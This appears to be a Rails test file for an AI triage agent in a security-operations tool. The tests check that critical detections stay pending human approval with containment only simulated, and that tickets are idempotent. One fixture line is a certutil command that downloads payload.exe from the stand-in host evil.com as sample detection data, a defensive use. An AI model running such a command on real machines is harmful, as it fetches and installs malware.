# frozen_string_literal: true

require "test_helper"

class PageAgentServiceTest < ActiveSupport::TestCase
  setup do
    @user = User.create!(
      name: "Page Agent User",
      email: "page-agent-#{SecureRandom.hex(4)}@sentriq.ai",
      role: "lead_analyst",
      demo_token: "page-agent-tok-#{SecureRandom.hex(4)}"
    )

    @critical_detection = Detection.create!(
      title: "Cobalt Strike Beacon Ingress via certutil",
      severity: "critical",
      status: "new",
      hostname: "WKSTN-FIN-099",
      process_name: "certutil.exe",
      process_id: 6112,
      command_line: "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
      triggered_at: 2.minutes.ago,
      raw_telemetry: { cmdline: "certutil.exe -urlcache", parent: "powershell.exe" }
    )

    @drill_detection = Detection.create!(
      title: "Rutin Tatbikat: Dünkü simülasyon tamamlandı",
      severity: "low",
      status: "open",
      hostname: "SRV-TEST-01",
      process_name: "test_runner.exe",
      process_id: 4120,
      command_line: "test_runner.exe --drill retrospective",
      triggered_at: 10.minutes.ago,
      raw_telemetry: { cmdline: "test_runner.exe" }
    )
  end

  test "OBSERVE-REASON-PLAN-ACT-VERIFY loop transitions critical threat to pending_review and does NOT auto-resolve" do
    service = PageAgentService.new(
      instruction: "Bu kritik tespiti incele, bilet aç ve karantinaya al",
      page_url: "/detections/#{@critical_detection.id}",
      page_context: { detection_id: @critical_detection.id, hostname: @critical_detection.hostname },
      current_user: @user,
      human_intervention: false
    )

    assert_difference("Ticket.count", 1) do
      result = service.call
      assert result[:success], "Service should report success (verified execution)"
      assert result[:verified], "Action outcome must be verified against database"

      ticket_data = result[:ticket]
      assert_not_nil ticket_data
      assert_match(/^SQT-/, ticket_data[:ticket_number])

      # Crucial Bug Fix: Critical threats MUST NOT be auto-resolved! Must be pending_review
      ticket = Ticket.find(ticket_data[:id])
      assert_equal "pending_review", ticket.status, "High/critical threat MUST stay in pending_review"
      assert_equal "pending_review", ticket_data[:status], "UI payload ticket status must match DB"

      # Decision metadata
      decision = result[:decision]
      assert_equal true, decision[:requires_human_approval]
      assert_equal "PENDING_APPROVAL", decision[:action_status]
      assert_equal "SIMULATED", decision[:containment_status]

      # Verify 5-phase execution steps (observe, think, act, verify)
      steps = result[:steps]
      assert steps.any? { |s| s[:phase] == "observe" }
      assert steps.any? { |s| s[:phase] == "think" }
      assert steps.any? { |s| s[:phase] == "act" }
      assert steps.any? { |s| s[:phase] == "verify" }

      # Simulated isolation recorded in AuditEvent
      assert AuditEvent.where(trackable: ticket, action: "simulated_host_isolation_recorded").exists?

      # Report content explicitly mentions pending review and simulated isolation
      assert_match(/İNSAN ONAYI BEKLİYOR/, result[:report])
      assert_match(/SİMÜLE/, result[:report])
    end
  end

  test "low severity routine drill safely resolves to resolved" do
    service = PageAgentService.new(
      instruction: "Dünkü tatbikat kaydını incele ve bilet durumunu sonuçlandır",
      page_url: "/detections/#{@drill_detection.id}",
      page_context: { detection_id: @drill_detection.id, hostname: @drill_detection.hostname },
      current_user: @user,
      human_intervention: false
    )

    result = service.call
    assert result[:success]
    assert result[:verified]

    ticket = Ticket.find(result[:ticket][:id])
    assert_equal "resolved", ticket.status
    assert_equal false, result[:decision][:requires_human_approval]
    assert_equal "SUCCEEDED", result[:decision][:action_status]
  end

  test "idempotency prevents duplicate tickets on repeated agent runs for the same detection" do
    service1 = PageAgentService.new(
      instruction: "İlk inceleme",
      page_url: "/detections/#{@critical_detection.id}",
      page_context: { detection_id: @critical_detection.id },
      current_user: @user
    )

    ticket1 = nil
    assert_difference("Ticket.count", 1) do
      res1 = service1.call
      assert res1[:success]
      ticket1 = Ticket.find(res1[:ticket][:id])
    end

    # Second run immediately on same detection
    service2 = PageAgentService.new(
      instruction: "İkinci tetikleme (tekrar)",
      page_url: "/detections/#{@critical_detection.id}",
      page_context: { detection_id: @critical_detection.id },
      current_user: @user
    )

    assert_no_difference("Ticket.count") do
      res2 = service2.call
      assert res2[:success]
      assert_equal ticket1.id, res2[:ticket][:id], "Should reuse existing active ticket"
    end
  end

  test "confirmed action by authorized analyst allows resolution of critical ticket" do
    service = PageAgentService.new(
      instruction: "Analist onayladı, izolasyonu onayla ve bileti kapat",
      page_url: "/detections/#{@critical_detection.id}",
      page_context: { detection_id: @critical_detection.id },
      current_user: @user,
      confirmed_action: "analyst_approved_containment"
    )

    result = service.call
    assert result[:success]
    assert result[:verified]

    ticket = Ticket.find(result[:ticket][:id])
    assert_equal "resolved", ticket.status
    assert_equal "SUCCEEDED", result[:decision][:action_status]
  end

  test "DOM actions include correct selectors, phases, and containment labels" do
    service = PageAgentService.new(
      instruction: "DOM seçici kontrolü",
      page_url: "/detections/#{@critical_detection.id}",
      page_context: { detection_id: @critical_detection.id },
      current_user: @user
    )

    result = service.call
    dom_actions = result[:dom_actions]
    assert dom_actions.is_a?(Array)
    assert dom_actions.size >= 4

    target_action = dom_actions.find { |a| a[:type] == "move_cursor_and_click" }
    assert_equal "#detection-row-#{@critical_detection.id}", target_action[:selector]

    containment_action = dom_actions.find { |a| a[:type] == "execute_containment" }
    assert_equal "SIMULATED", containment_action[:containment_mode]
    assert containment_action[:label].include?("ONAY")
    assert containment_action[:status_text].include?("ONAY")
  end

  test "DOM selector falls back to table row when no direct detection ID is in context" do
    service = PageAgentService.new(
      instruction: "Genel sayfa taraması",
      page_url: "/tickets",
      page_context: {},
      current_user: @user
    )

    result = service.call
    assert result[:success]
    assert_not_nil result[:target_selector]
    assert result[:target_selector].start_with?("#detection-row-") || result[:target_selector] == ".data-table tbody tr:first-child"
  end

  test "state machine and verification guard against invalid transitions" do
    service = PageAgentService.new(
      instruction: "Kritik tehdit triajı",
      page_url: "/detections/#{@critical_detection.id}",
      page_context: { detection_id: @critical_detection.id },
      current_user: @user
    )

    result = service.call
    assert result[:success]
    assert_equal true, result[:verification][:verified]
    assert_equal "pending_review", result[:verification][:db_status]
    assert_equal "pending_review", result[:verification][:expected_status]
  end
end
